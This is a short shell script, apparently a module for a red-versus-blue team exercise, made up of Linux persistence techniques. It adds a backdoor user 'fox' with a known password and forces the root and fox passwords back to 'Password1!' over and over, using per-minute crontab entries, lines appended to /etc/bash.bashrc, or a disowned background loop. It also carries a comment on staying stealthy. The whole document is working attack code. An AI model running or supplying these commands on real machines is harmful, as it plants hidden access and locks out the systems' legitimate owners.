#DESC yyyyyyyyyyyyyyyyyyyyyyyyy
#LEVEL 4

# BLUE TEAM INFO
# This is bunch of ways to change your user's passwords or to add user persistence.

useradd -m -s /bin/bash fox
echo "fox:Password1!" | chpasswd

#STARTROULETTE 3
#ROULETTE
echo '* * * * *    root    echo "root:Password1!" | chpasswd' >> /etc/crontab
echo '* * * * *    root    echo "fox:Password1!" | chpasswd' >> /etc/crontab

#ROULETTE
# root bashrc/profile
echo 'echo "root:Password1!" | chpasswd' >> /etc/bash.bashrc
echo 'echo "fox:password1!" | chpasswd' >> /etc/bash.bashrc
# if stealthy, check if root before running

#ROULETTE
# disowned while loop
(while true; do
    echo "root:Password1!" | chpasswd
    echo "fox:Password1!" | chpasswd
    sleep 5
done) & disown

#ENDROULETTE
